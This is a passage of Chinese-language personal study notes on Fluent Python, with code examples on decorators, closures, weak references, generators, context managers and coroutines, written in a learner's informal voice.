-&gt; str: # 备注参数和返回值的类型 &quot;&quot;&quot;省略&quot;&quot;&quot; 注解会存储在函数的 _annotations_ 属性中； 注解本身不会做任何事情，有注解跟没有注解是一样的；但是注解可以给第三方工具（例如框架、装饰器等）提供有用的信息，例如 IDE 或者 Lint 工具可以利用注解来检查； 支持函数式编程的包operator 模块operator 模块提供了一些算术运算符函数，它让代码更加简单易懂； 12345from functools import reducefrom operator import mul def fact(n): return reduce(mul, range(1, n+1)) # mul 函数可用来计算两个数值的乘积 itemgetter 可用来读取元组中的元素 1234567891011&gt;&gt;&gt; metro_data = [... (&#x27;Tokyo&#x27;, &#x27;JP&#x27;, 36.933, (35.689722, 139.691667)),... (&#x27;Delhi NCR&#x27;, &#x27;IN&#x27;, 21.935, (28.613889, 77.208889)),... (&#x27;Mexico City&#x27;, &#x27;MX&#x27;, 20.142, (19.433333, -99.133333)),... (&#x27;New York-Newark&#x27;, &#x27;US&#x27;, 20.104, (40.808611, -74.020386)),... (&#x27;Sao Paulo&#x27;, &#x27;BR&#x27;, 19.649, (-23.547778, -46.635833)),... ]&gt;&gt;&gt;&gt;&gt;&gt; from operator import itemgetter&gt;&gt;&gt; for city in sorted(metro_data, key=itemgetter(1)): # itemgetter(1) 等同于 lamba fields : fields[1]... print(city) 12345678910# 此处的 itemgetter 的两个参数，表示读取两个位置的值，组成元组&gt;&gt;&gt; cc_name = itemgetter(1, 0)&gt;&gt;&gt; for city in metro_data:... print(cc_name(city))...(&#x27;JP&#x27;, &#x27;Tokyo&#x27;)(&#x27;IN&#x27;, &#x27;Delhi NCR&#x27;)(&#x27;MX&#x27;, &#x27;Mexico City&#x27;)(&#x27;US&#x27;, &#x27;New York-Newark&#x27;)(&#x27;BR&#x27;, &#x27;Sao Paulo&#x27;) attrgetter 与 itemgetter 的不同之处在于它使用名称来提取对象的属性； methodcaller 接受一个参数，表示要调用的函数名称，然后它可以在之后传入的对象中调用相应的方法； 123456789&gt;&gt;&gt; from operator import methodcaller&gt;&gt;&gt; s = &#x27;The time has come&#x27;&gt;&gt;&gt; upcase = methodcaller(&#x27;upper&#x27;) # 表示调用 upper 方法&gt;&gt;&gt; upcase(s) # 在 s 身上调用 upper 方法&#x27;THE TIME HAS COME&#x27;&gt;&gt;&gt; hiphenate = methodcaller(&#x27;replace&#x27;, &#x27; &#x27;, &#x27;-&#x27;) # 调用 replace 方法&gt;&gt;&gt; hiphenate(s) # 在 s 身上调用&#x27;The-time-has-come&#x27; 使用 functools.partial 冻结参数partial 可用来将某个函数的参数设置为固定值 1234567&gt;&gt;&gt; from operator import mul&gt;&gt;&gt; from functools import partial&gt;&gt;&gt; triple = partial(mul, 3) # mul 原本接受两个参数，此处将 mul 的第一个参数固定 3&gt;&gt;&gt; triple(7) # 调用时，只需传入第二个参数即可计算出结果21&gt;&gt;&gt; list(map(triple, range(1, 10))) [3, 6, 9, 12, 15, 18, 21, 24, 27] 第6章 使用一等函数实现设计模式策略模式在函数作为一等公民时，很多设计模式就有了更简单的实现方法了；例如策略模式中，每个策略对应一个类；实际上它们都可以简单替换成函数即可，完全没有必要单独为了调用它而去实例化一个对象； 命令模式命令模式的本意是想在命令的调用者（操作对象）和接收者（实现对象）之间进行解耦，这样调用者无须了解各个接收者具体是什么接口，而让它们对接口进行统一命名；但其实有更简单的做法，即直接将各个实现绑定到调用者身上就可以了，有点像回调那样； 面向对象之所以要搞成那么复杂，完全是因为它们不能接受函数作为参数，而是只能接受对象做为参数，然后再去调用对象的方法，这样就不得不对所调用的方法有个规范命名，不然就不知道如何调用；但如果能够接受函数作为参数，那就完全不一样了，直接将形参当作函数调用即可，非常简单直观，容易理解； 第7章 函数装饰器和闭包装饰器基础知识装饰器是一个可调用的对象，类似函数，它的参数是另外一个函数，它的目的是对该函数进行打包封装，干些额外的工作；它的执行结果有可能会返回参数函数，也有可能是返回另外一个新的函数或可调用对象，并赋值给原本作为参数的函数名称，这样调用者并不知道这个函数可能已经被替换了； 123456789@decoratedef target(): print(&quot;running target()&quot;) # 上面的写法跟下面的写法是一个意思def target(): print(&quot;running target()&quot;) target = decorate(target); Python 何时执行装饰器注意，在定义装饰器的代码文件被加载时，装饰器会被立即执行，此时被装饰的函数还没有被调用； 使用装饰器改进策略模式1234567891011121314151617181920promos = [] def promotion(promo_func): promos.append(promo_func) return promo_func@promotion # 使用装饰器，在添加新的折扣策略时，不容易遗漏def fidelity(order): &quot;&quot;&quot;为积分为1000或以上的顾客提供5%折扣&quot;&quot;&quot; return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0 @promotion @promotion def bulk_item(order): &quot;&quot;&quot;单个商品为20个或以上时提供10%折扣&quot;&quot;&quot; discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discount 变量作用域规则python 在编译函数定义时，它会先检查函数中声明的局部变量； 如果变量存在，那么之后使用变量时，解释器只会在本地作用域中寻找； 如果不存在，那么就会到函数的定义环境中寻找全局变量； global 关键字可用来告知某个变量为全局的，以引导解释器到正确的位置查找 123456&gt;&gt;&gt; b = 6&gt;&gt;&gt; def f3(a):... global b... print(a)... print(b)... b = 9 闭包如果函数引用了某个变量，该不在其定义内部定义，而是在函数外部定义的，那么解释器会在函数对象中，保留一个指向该外部变量的引用，以便在使用该变量时，能够取到相应的值； 12345678def make_averager(): series = [] def averager(new_value): # 此处引用的 series 变量在 averager 外部定义，averager 对象属性中会保存它的引用 series.append(new_value) total = sum(series) return total/len(series) return averager nonlocal 声明1234567891011121314151617181920212223def make_averager(): count = 0 total = 0 def averager(new_value): count += 1 # 此处的表达式等同于 count = count + 1，因此解释器会将 count 当作局部变量 # 因此在执行 count + 1 会出现报错 total += new_value return total / count return averager# 为了解决以上问题，需要用 nonlocal 关键字将 count 和 total 声明为非局部变量def make_averager(): count = 0 total = 0 def averager(new_value): nonlocal count, total # 声明 nonlocal count += 1 total += new_value return total / count return averager 实现一个简单的装饰器1234567891011import timedef clock(func): def clocked(*args): # 不支持关键字参数 t0 = time.perf_counter() result = func(*args) elapsed = time.perf_counter() - t0 name = func.__name__ arg_str = &quot;, &quot;.join(repr(arg) for arg in args) print(&#x27;[%0.8fs] %s(%s) -&gt; %r&#x27; % (elapsed, name, arg_str, result)) return clocked 支持关键字参数的版本 12345678910111213141516171819import timeimport functoolsdef clock(func): @functools.wraps(func) # 用于将函数属性从 func 复制到 clocked 函数中，例如函数名称等 def clocked(*args, **kwargs): # 支持关键字参数 t0 = time.perf_counter() result = func(*args, **kwargs) elapsed = time.perf_counter() - t0 name = func.__name__ arg_lst = [] if args: arg_lst.append(&quot;, &quot;.join(repr(arg) for arg in args)) if kwargs: pairs = [&#x27;%s=%r&#x27; % (k, w) for k, w in sorted(kwargs.items())] arg_lst.append(&quot;, &quot;.join(pairs)) arg_str = &quot;, &quot;.join(arg_lst) print(&#x27;[%0.8fs] %s(%s) -&gt; %r &#x27; % (elapsed, name, arg_str, result)) return clocked 标准库中的装饰器使用 lru_cache 缓存lru_cache 可以帮助缓存函数的计算结果，如果下次再传入相同的参数，则直接从缓存中返回计算结果，不再重复计算，这会极大的提高性能，尤其是存在大量重复计算的场景，例如计算斐波契那数列； lru 的全称 least recently used 单分派泛函数 所谓的分泛函数是指这个函数的功能用于分别派分任务，它根据参数值，使用一串 if elif else 来分别调用相应的函数；在 OO 的语言中一般叫重载，但 Python 不支持重载； singledispatch 装饰器，可以将多个函数组合成一个泛函数； 123456789101112131415161718192021222324from functools import singledispatchfrom collections import abcimport numbersimport html@singledispatch # 将 htmlize 包装成了泛函数，之后它可以注册不同的参数 def htmlize(obj): content = html.escape(repr(obj)) return &#x27;&lt;pre&gt;&#123;&#125;&lt;/pre&gt;&#x27;.format(content)@htmlize.register(str) # 注册重载 str 类型def _(text): content = html.escape(text).replace(&#x27;\\n&#x27;, &#x27;&lt;br&gt;\\n&#x27;) return &#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;.format(content)@htmlize.register(numbers.Integral) # 注册重载 int 类型def _(n): return &#x27;&lt;pre&gt;&#123;0&#125; (0x&#123;0:x&#125;)&lt;/pre&gt;&#x27;.format(n)@htmlize.register(tuple) # 注册 tuple 类型@htmlize.register(abc.MutableSequence) # 可多个类型叠加def _(seq): inner = &#x27;&lt;/li&gt;\\n&lt;li&gt;&#x27;.join(htmlize(item) for item in seq) return &#x27;&lt;ul&gt;\\n&lt;li&gt;&#x27; + inner + &#x27;&lt;/li&gt;\\n&lt;/ul&gt;&#x27; singledispatch 可以用来装饰自己编写的函数，也可以用来装饰他人编写的函数； 叠放装饰器装饰器支持叠放 1234567@d1@d2def f(): print(&quot;f&quot;) #等同于f = d1(d2(f)) 参数化装饰器通过创建一个装饰器工厂函数，便可使装饰器支持传入参数；调用该装饰器工厂函数时，返回的是真正的装饰器； 第8章 对象引用、可变性和垃圾回收变量不是盒子变量本身是一个独立的东西，我们借助它，让它指向某个对象，以方便实现引用该对象； 标识、相等性和别名在 Python 中，判断两个对象是否相同，有两种方法，一种是 &#x3D;&#x3D; 两个等号，一种是使用关键字 is，它们的意思是不一样的；&#x3D;&#x3D; 会调用对象的 __eq __ 方法进行判断，它比的是值相等即可，is 等是判断对象的 id，相当于内存的地址； 由于 is 比较的是地址，因为使用 is 进行判断它的性能很好；因为使用 &#x3D;&#x3D; 进行判断的话，需要遍历对象的属性值； object 类型的 eq 方法比较的是 id，但是其他大多数内置类型的 eq 方法比较的是值； 当元组用于保存对象时，它保存的是对象的引用。虽然元组本身不可变，但这个引用背后的对象自身是可以变的； 默认做浅复制如果要做深复制，需要使用 deepcopy 方法；浅复制则使用 copy 方法； 函数的参数作为引用时千万不要将函数参数的默认值设置为可变对象，而应该设置为 None；因为如果是可变对象，那么在函数载入时，会自动创建出来；这样导致多次不传参数的调用该函数时，多个函数都会指向该默认值，造成相互影响； 12345678910class HauntedBus: def __init__(self, passengers=[]): # 这里默认值 [] 是大忌，千万要避免 self.passengers = passengers def pick(self, name): self.passengers.append(name) def drop(self, name): self.passengers.remove(name) 如果函数的参数是一个可变对象，那么让函数对该对象进行修改，会直接作用到外部的实参对象上。有时候，这是想要的结果，有时候则不是非预期的结果。如果是非预期的结果，那么函数内部应对该实参进行复制； del 和垃圾回收del 关键字并不是用来销毁对象的，而仅仅是切割变量和对象之间的引用关系；当对象的引用数量为零时，销毁的工作会垃圾回收器处理； 弱引用弱引用不会增加对象的引用计数，这样不会对对象的垃圾回收带来干扰；一般用于有生命周期限制的缓存管理中； 12345678910111213141516171819&gt;&gt;&gt; import weakref&gt;&gt;&gt; a_set = &#123;0, 1&#125;&gt;&gt;&gt; wref = weakref.ref(a_set) ➊&gt;&gt;&gt; wref&lt;weakref at 0x100637598; to &#x27;set&#x27; at 0x100636748&gt;&gt;&gt;&gt; wref() ➋&#123;0, 1&#125;&gt;&gt;&gt; a_set = &#123;2, 3, 4&#125; ➌&gt;&gt;&gt; wref() ➍&#123;0, 1&#125;&gt;&gt;&gt; wref() is None ➎False&gt;&gt;&gt; wref() is None ➏True WeakValueDictionary 是一种可变映射（字典也是一种可变映射），映射指向的值是对象的弱引用；当对象被回收时，对应的键会自动从 WeakValueDictionary 中被删除；因此，它很适合用来做缓存； 12345678910111213141516171819202122class Cheese: def __init__(self, kind): self.kind = kind def __repr__(self): return &#x27;Cheese(%r)&#x27; % self.kind &gt;&gt;&gt; import weakref&gt;&gt;&gt; stock = weakref.WeakValueDictionary() # 实例化&gt;&gt;&gt; catalog = [Cheese(&#x27;Red Leicester&#x27;), Cheese(&#x27;Tilsit&#x27;),... Cheese(&#x27;Brie&#x27;), Cheese(&#x27;Parmesan&#x27;)]...&gt;&gt;&gt; for cheese in catalog:... stock[cheese.kind] = cheese # 将 stock 的键映射到 cheese 实例上...&gt;&gt;&gt; sorted(stock.keys())[&#x27;Brie&#x27;, &#x27;Parmesan&#x27;, &#x27;Red Leicester&#x27;, &#x27;Tilsit&#x27;] ➌&gt;&gt;&gt; del catalog&gt;&gt;&gt; sorted(stock.keys())[&#x27;Parmesan&#x27;] # 为什么删除 catalog 后，没有全部删除，而是还剩下一个？&gt;&gt;&gt; del cheese # for 循环中的 cheese 是全局变量，因此需要显式删除，不然仍然有一个引用&gt;&gt;&gt; sorted(stock.keys())[] 不是每个 python 对象都可以被弱引用，例如常用的 list 和 dict 实例无法被弱引用，但是它们的子类可以；set 实例也可以 1234567class MyList(list):&quot;&quot;&quot;list的子类，实例可以作为弱引用的目标&quot;&quot;&quot;a_list = MyList(range(10))# a_list可以作为弱引用的目标wref_to_a_list = weakref.ref(a_list) Python 对不可变类型施加的把戏使用一个元组构建另外一个元组，结果得到的是同一个元组 1234&gt;&gt;&gt; t1 = (1, 2, 3)&gt;&gt;&gt; t2 = tuple(t1)&gt;&gt;&gt; t2 is t1True 在 CPython 中，当对象的引用数量为零，会立即触发垃圾回收。但其他 Python 实现则不一定如此；这里涉及到性能的权衡； 第9章 符合 Python 风格的对象对象表示形式Python 默认使用两个函数来表示对象的字符串形式，它们分别是 repr() 和 str() 函数。它们实际上调用的是对象的 _repr_ 和 _str_ 另外还有一个 bytes() 函数会调用 _bytes_ 方法来返回字节序列； 再谈向量类以下是自定义向量类的待实现功能 1234567891011121314151617181920&gt;&gt;&gt; v1 = Vector2d(3, 4)&gt;&gt;&gt; print(v1.x, v1.y) # 能够通过点运算符，直接访问属性3.0 4.0&gt;&gt;&gt; x, y = v1 # 支持元组拆包&gt;&gt;&gt; x, y(3.0, 4.0)&gt;&gt;&gt; v1 # repr 的显示格式Vector2d(3.0, 4.0)&gt;&gt;&gt; v1_clone = eval(repr(v1)) # 基于 repr 结果生成对象&gt;&gt;&gt; v1 == v1_clone # 支持 == 运算符True&gt;&gt;&gt; print(v1) # str 的实现(3.0, 4.0)&gt;&gt;&gt; octets = bytes(v1) # 生成实例的二进制表示&gt;&gt;&gt; octetsb&#x27;d\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x08@\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10@&#x27;&gt;&gt;&gt; abs(v1) # 支持 abs 方法，返回实例的模5.0&gt;&gt;&gt; bool(v1), bool(Vector2d(0, 0)) # 支持 bool 方法，模为零时，返回 False(True, False) 备选构造方法classmethod 与 staticmethodclassmethod 修饰的函数，调用时，不需要实例化对象；该函数的第一个参数是类本身，从而可以借助该函数，访问类的相关成员； classmethod 的一个常见用途时定义额外的构造方法，一般该构造方法会对传入的数据进行清洗，之后再构造对象； 12345@classmethoddef frombytes(cls, octets): # 第一个参数不是 self, 而是类本身 typecode = chr(octets[0]) memv = memoryview(octets[1:]).cast(typecode) return cls(*memv) 格式化显示12&gt;&gt;&gt; &#x27;1 BRL = &#123;rate:0.2f&#125; USD&#x27;.format(rate=brl) # rate 表示具名变量&#x27;1 BRL = 0.41 USD&#x27; 关于如何格式化，python 有一套自己的语法规则，可称之为微语言；这套微语言是可扩展的，可以自定义如何解释 forma_spec 参数 可散列的 Vector2d通过实现 _hash_ 和 _eq_ 方法，可将一个不可散列的自定义类的对象，变成可散列的； Python 的私有属性和受保护的属性python 没有类似 Java 中的 private 关键字，而是通过给类成员的名称添加两个下划线前缀，将该成员标记为私有成员，类似这样：__x，但也有一些人喜欢使用一个下划线来表示； 对于私有属性，解释器在实例化对象时，会给这些属性加上类名作为前缀，这样一来，直接用双下划线访问私有属性时，会提示该属性并不存在，从而实现访问控制；但实际上是可以访问的，只是曲折一点，需要加上类名前缀来访问； 使用 slots 类属性节省空间默认情况下，类的实例在 _dict_ 字段中使用字典来存储属性成员，如果成员比较多的，会占据较大的内存，此时可考虑使用 _slot_ 属性来存储以节省内存；它的原理是使用元组来存储，所以节省内存； 123class Vector2d: __slots__ = (&#x27;__x&#x27;, &#x27;__y&#x27;) typecode = &#x27;d&#x27; 覆盖类属性Python 的类属性可以为实例属性提供默认值，这个默认值在实例中可以被重新赋值； 如果要批量处理，则可以考虑定义一个子类，该子类的属性重写，之后使用子类来实例化对象； 第10章 序列的修改、散列和切片鸭子类型：只要实现一些约定的接口，即可当作拥有目标类型的特征，并可以像目标类型一样被处理；例如一个类只需要实现 getitem 和 len 两个接口，那么它就可以被当作序列类型一样处理，至于它是谁的子类，并不重要； zip 函数可用于并行迭代多个序列，它会将多个序列的对象打包成元组，然后可以拆包赋值给各个变量； 第11章 接口：从协议到抽象基类接口与协议一个类只需要实现了某些特定的接口，它就可以被当作特定的类型进行操作（即鸭子类型）； 当一个类实现了 getitem 接口时，即使它没有实现 contains 和 iter 接口，它也是可迭代，并且支持 in 运算符的；因为解释器会调用 getitem 接口来实现以上两项功能； Python 类中的方法，第一个参数叫 self 纯粹是一种惯例，其实叫个其他名字也无妨； 猴子补丁猴子补丁：如果一个类在定义时，没有定义某个方法；之后在运行时，可以在外部单独定义一个函数，然后把这个函数绑定到类的某个属性上，这样就让类动态获得了某个方法； 抽象基类抽象基类一般用于编写框架的场景，如果是业务场景，几乎不太可能需要自己编写抽象基类，而是使用现成的就可以了； 当继承抽象基类，就需要手工实现抽象基类中规定的所有方法，不管该方法是否用得到； 标准库中的 ABC ABC：抽象基类，abstract base class 不可变集合：Sequence, Mapping, Set 可变集合：MutableSequence, MutableMapping, MutableSet 数字塔numbers 包定义了数字抽象基类的线性层次结构：Number &lt; Complex &lt; Real &lt; Rational &lt; Integral； 第12章 继承的优缺点子类化内置类型很麻烦内置类型的方法不会调用子类覆盖后的方法，它只会调用内置类型原本的方法；因此，不会子类化内置类型，Python 有专门给用户子类化的类型，以 User 开头，例如 UserDict、UserList、UserString 等； 猜测原因在于内置类型的很多方法，出于性能考虑，是用 C 语言专门优化过的，因此不严格遵行继承的定义； 多重继承和方法解析顺序多重继承会面临菱形问题，即子类继承多个父类中，存在同名的方法，导致子类无法确定应该执行哪个父类的同名方法； 多重继承的真实应用处理多重继承Django 示例第13章 正确重载运算符第14章 可迭代对象、迭代器和生成器 迭代器模式：惰性加载数据，处理时加载，这样可以用较小的内存，处理很大的数据集； Python 中使用生成器来实现迭代器模式；生成器也是为了迭代数据，因此可将它当作迭代器来使用，唯一的区别在于它的惰性； 在 Python3 中，生成器是很普遍的，只是使用的时候没有觉察，例如 range(10) 返回的是一个类似生成器的对象；如果想要获得完整的列表，需要写成 list(range(10))； 可迭代对象和迭代器对比区别：从可迭代对象中，获取迭代器；迭代器如果迭代完毕，则不再可用，需要重新构建； 所谓的迭代器，可以理解为一个对象，每次调用它的 next 方法，可返回一个元素；如果空了，会报错； 通常迭代器还有一个 iter 方法，调用这个方法，可返回迭代器本身；理论上不实现它，也不会影响迭代功能。但如果实现了它，issubclass 方法可将其判断为 Iterator 的子类； 可迭代对象也有一个 iter 方法，调用它，会返回一个新的迭代器； 生成器函数1234567891011121314151617import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) # iter 使用了 yield 关键字，调用 iter 会返回生成器对象，此时 iter 是个生成器函数 def __iter__(self): for word in self.words: yield word 生成器函数的工作原理yield 关键字有点像 await，每次执行到 yield 所在的语句时，会暂停等待； for 循环语句会自动捕获并处理迭代器抛出的异常； 惰性实现re 模块除了 findall 函数，还有一个生成器版本的 finditer 函数；它每次只返回一个匹配项；当数据量很大时，可以节省很多内存； 123456789101112131415import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) def __iter__(self): for match in RE_WORD.finditer(self.text): # finditer 返回生成器 yield match.group() 生成器表达式生成器表达式有点像是列表推导的惰性版本； 123456789101112131415161718192021222324252627282930&gt;&gt;&gt; def gen_AB(): # ➊... print(&#x27;start&#x27;)... yield &#x27;A&#x27;... print(&#x27;continue&#x27;)... yield &#x27;B&#x27;... print(&#x27;end.&#x27;)...&gt;&gt;&gt; res1 = [x*3 for x in gen_AB()] # res1 是一个列表，由生成器 gen_Ab 的返回值组成startcontinueend.&gt;&gt;&gt; for i in res1: # ➌... print(&#x27;--&gt;&#x27;, i)...--&gt; AAA--&gt; BBB&gt;&gt;&gt; res2 = (x*3 for x in gen_AB()) # res2 是一个生成器&gt;&gt;&gt; res2 &lt;generator object &lt;genexpr&gt; at 0x10063c240&gt;&gt;&gt;&gt; for i in res2: # 遍历 res2，此时 gen_AB 函数才真正的执行... print(&#x27;--&gt;&#x27;, i)...start--&gt; AAAcontinue--&gt; BBBend. 12345678910111213141516import reimport reprlibRE_WORD = re.compile(&#x27;\\w+&#x27;)class Sentence: def __init__(self, text): self.text = text def __repr__(self): return &#x27;Sentence(%s)&#x27; % reprlib.repr(self.text) # 使用表达式构建一个生成器，而不是用 yield 来生成 # 生成器表达式是一个语法糖，本质上跟使用 yield 的生成器函数没有区别 def __iter__(self): return (match.group() for match in RE_WORD.finditer(self.text)) 何时用生成器表达式生成器表达式是构建生成器的简捷方式，无需通过 def 定义函数来实现；但限于一些简单场景，一行可以搞定的那种；如果业务逻辑比较复杂，一行代码搞不定的话，则仍然需要使用函数来定义； 标准库 itertools 模块中有很多现成的生成器； itertools.count(start, step)：创建一个数字生成器 itertools.takewhile 给生成器添加条件限制 123&gt;&gt;&gt; gen = itertools.takewhile(lambda n: n &lt; 3, itertools.count(1, .5))&gt;&gt;&gt; list(gen)[1, 1.5, 2.0, 2.5] 标准库中的生成器在创建任何生成器前，很有必要先查一下标准库中有哪些生成器可用，以避免重复造轮子； yield fromyield from 可用来作为可迭代对象的生成器 123456789101112131415161718&gt;&gt;&gt; def chain(*iterables):... for it in iterables:... for i in it:... yield i...&gt;&gt;&gt; s = &#x27;ABC&#x27;&gt;&gt;&gt; t = tuple(range(3))&gt;&gt;&gt; list(chain(s, t))[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, 0, 1, 2]# 上面的写法，用 yield from 重写如下，可减少一层 for 循环&gt;&gt;&gt; def chain(*iterables):... for i in iterables:... yield from i...&gt;&gt;&gt; list(chain(s, t))[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, 0, 1, 2] 可迭代的归约函数归约函数：接受一个可迭代的对象，返回一个值，例如 reduce 函数； 深入分析 iter 函数iter 函数用于生成迭代器，一般接收一个可迭代对象作为参数；但是它还有个用法是接收两个参数，第一个参数是个可迭代对象，第二个参数是个 predicate，当可迭代对象产生的值满足 predicate 时，就停止产出； 12345678910111213&gt;&gt;&gt; def d6():... return randint(1, 6)...&gt;&gt;&gt; d6_iter = iter(d6, 1)&gt;&gt;&gt; d6_iter&lt;callable_iterator object at 0x00000000029BE6A0&gt;&gt;&gt;&gt; for roll in d6_iter:... print(roll)...4363 生成器很适合用来处理大数据集，这样可以利用有限的内存，处理无限大的数据，例如大型数据库； 生成器当作协程生成器对象有个 send 方法，该方法允许给生成器对象发送消息； 第15章 上下文管理器和 else 块elseelse 不仅可以跟 if 搭配使用，还可以跟 for, while, try 搭配使用；在这些场景中，else 实际上是 then 的意思，表示某个动作如果顺利完成了，那么就执行 else 里面的语句；如果没有顺利完成，就不执行； 12345for item in my_list: if item.flavor == &#x27;banana&#x27;: breakelse: # 如果 for 循环结束，没有触发 break，那么就执行 else；如果触发，就退出循环，不执行else raise ValueError(&#x27;No banana flavor found!&#x27;) 123456try: dangerous_call()except OSError: log(&#x27;OSError...&#x27;)else: # 如果 dangerous_call 顺利执行，没有报异常，则执行 else；如果报异常，就不执行 else after_call() withwith 的目标是安全的实现 try…finally；with 之后的表达式（例如 open 函数）会创建一个上下文管理器对象。该对象有两个方法，分别是 enter 和 exit；with 语句开始执行时，会调用 enter 方法；执行结束后，会调用 exit 方法，类似 finally 的作用； 123456# with...as... 是一个表达式，该表达式的前半段子句，会创建上下文管理器对象，并执行 enter 方法# enter 方法执行完成后，会将结果返回到 fp 变量上，但 as 并不是必须的，有些场景并不需要返回什么东西&gt;&gt;&gt; with open(&#x27;mirror.py&#x27;) as fp: ... src = fp.read(60) # # 当解释器执行完整个 with 块的语句后，会调用 exit 方法，清理现场 1234567891011121314151617# 以下是一个上下文管理器类的示例class LookingGlass: def __enter__(self): # 做准备工作 import sys self.original_write = sys.stdout.write sys.stdout.write = self.reverse_write return &#x27;JABBERWOCKY&#x27; def reverse_write(self, text): # 实际干活的方法 self.original_write(text[::-1]) def __exit__(self, exc_type, exc_value, traceback): # 做清理工作 import sys sys.stdout.write = self.original_write if exc_type is ZeroDivisionError: print(&#x27;Please DO NOT divide by zero!&#x27;) return True contextlib 模块中有一些现成的工作，可用来创建自定义的 context 类（上下文管理器）； @contextmanagercontextmanager 装饰器可以简化上下文管理器的定义 1234567891011121314151617181920import contextlib@contextlib.contextmanager # 该装饰器会将 looking_glass 函数包装成带有 enter 和 exit 方法的类def looking_glass(): import sys original_write = sys.stdout.write def reverse_write(text): original_write(text[::-1]) sys.stdout.write = reverse_write msg = &#x27;&#x27; try: yield &#x27;JABBERWOCKY&#x27; # 这里 yield 起到了类似分隔的作用，enter 执行到这里，后面由 exit 执行 except ZeroDivisionError: msg = &quot;Please DO NOT divide by zero&quot; finally: sys.stdout.write = original_write if msg: print(msg) 个人感觉所谓的上下文管理器，本质上也像是一个实现了约定协议的鸭子类型，只要按照协议实现 enter 和 exit 方法即可； 第16章 协程yield 有两个兽性，一个是生成，一个是退让；这两个意思刚好是协程的描述； 当 yield 放在表达式的左边时，它做为生成器使用； 当 yield 放在表达式的右边时，它做为协程使用，等待传入值； 123456789101112131415&gt;&gt;&gt; def simple_coroutine(): # ➊... print(&#x27;-&gt; coroutine started&#x27;)... x = yield # yield 右边没有值，意味着它生成 None... print(&#x27;-&gt; coroutine received:&#x27;, x)...&gt;&gt;&gt; my_coro = simple_coroutine()&gt;&gt;&gt; my_coro # 生成器已经创建，但是还没有启动，需要通过 next 让它启动&lt;generator object simple_coroutine at 0x100c2be10&gt;&gt;&gt;&gt; next(my_coro) # 通过 next 来启动生成器-&gt; coroutine started&gt;&gt;&gt; my_coro.send(42) # 给 yield 传值，仅当协程处于暂停状态时，才能够给它传值-&gt; coroutine received: 42Traceback (most recent call last): # ➏...StopIteration 协和在 yield 关键字所在的位置暂停执行 使用协程重新设计平均值计算器 12345678910111213141516171819def averager(): total = 0.0 count = 0 average = None while True: # 永远不会停止，可以无限计算平均值 term = yield average # 等待外部传入值，外部每传一次，就计算一次总体平均值 total += term count += 1 average = total/count # 以下是使用示例&gt;&gt;&gt; coro_avg = averager() # 创建&gt;&gt;&gt; next(coro_avg) # 激活&gt;&gt;&gt; coro_avg.send(10) # 传值10.0&gt;&gt;&gt; coro_avg.send(30)20.0&gt;&gt;&gt; coro_avg.send(5)15.0 使用协程时，经常容易忘记要先激活它。为了避免这种错误，可考虑定义一个帮忙激活的装饰器 12345678910from functools import wrapsdef coroutine(func): &quot;&quot;&quot;定义一个装饰器：帮忙预激`func`&quot;&quot;&quot; @wraps(func) def primer(*args,**kwargs): ➊ gen = func(*args,**kwargs) ➋ next(gen) # 激活 return gen ➍ return primer 在调用生成器的 send 函数时，如果给它传递的参数类型有误，会导致它抛出异常，从而终止协程； 生成器有一个 throw 方法可用于触发异常；如果生成器内部有处理异常的代码，则执行；如果没有，则冒泡； 生成器还有一个 close 方法可用于抛出 exit 异常 yield fromyield from 带来了双向通讯机制，貌似可用来实现异步编程；先定义生成器，然后激活它；之后向它发送数据；当数据处理完成后，会触发异常，获得处理结果； 12345678910111213141516171819202122232425262728293031323334353637from collections import namedtupleResult = namedtuple(&#x27;Result&#x27;, &#x27;count average&#x27;)# 子生成器def averager(): total = 0.0 count = 0 average = None while True: term = yield # 感觉此处有点像是一个点位符，等待外部传值进来，或许应该叫 await if term is None: # 当外部传 None 进来时，就中断退出循环 break total += term count += 1 average = total/count return Result(count, average) # 中断循环后，返回计算结果# 委托生成器def grouper(results, key): # 这里为什么要循环？ # 答：为了不断接收外面传进来的值 while True: # 关键字 yield from 默认会让当前函数返回一个生成器，可惜这个关键字很不直观 # send 传进来的值，会通过传入 averager，yield from 有点像管道的作用 results[key] = yield from averager() # 这里的 yield from 很像 await # 客户端（调用方）def main(data): results = &#123;&#125; for key, values in data.items(): group = grouper(results, key) # grouper 返回生成器 next(group) # 预激活 # 激活后，开始进入 while 循环，在 yield from 处暂停 for value in values: group.send(value) # send 将值传给 averager，开始与内部的子生成器通讯 group.send(None) # 传入None，中断子生成器，让委托生成器获得结果 print(results) yield from 跟 await 有一个很大的不同，即 yield from 在将工作做到一半后，将控制权还给调用者，由调用者做剩下的工作； 据说 python 后来引入了 await 第19章 并发模型协程: coroutine，一个可以暂停并重新运行自己的函数； 协程的特点在于可以通过关键字，标识出异步的位置，然后交出控制权，让主程序的其他部分获得控制权；自己则进入队列，等待异步的代码执行完毕；改变自己状态，等待被唤醒，继续运行自己余下部分的代码； 没想到 Python 有一个全局锁（GIL），每次只允许一个线程占有，那这就意味着 python 无法同时利用多核的优势好像，除非起多个进程，就像 js 的 cluster 一样； Python 解释器每隔一定的时间（貌似是 5ms），会释放 GIL，以便其他线程能够获取锁；另外，任意一个函数在调用 syscall 时，它都会释放 GIL； 书里面的 spinner 案例，看起来很奇怪，因为协程的结束，竟然是由调用者的代码发起的，跟 js 好像不太一样；但是 await 貌似是一样的； 后来发现，协程也可以自己结束，不需要外部让它结束；书上的案例只是示范说可以主动干预。但其实正常使用场景是不干预，让它自行运行结束，返回结果； 问：好奇有无可能用装饰器，将非协程的代码，包装成协程代码？答：想了一下，虽然可能，但是由于非协程代码里面，在遇到 I&#x2F;O 任务时，没有使用 await 交出控制权，该协程貌似可能会卡在那里等待； 协程能够起作用，貌似重点在于每次遇到 I&#x2F;O 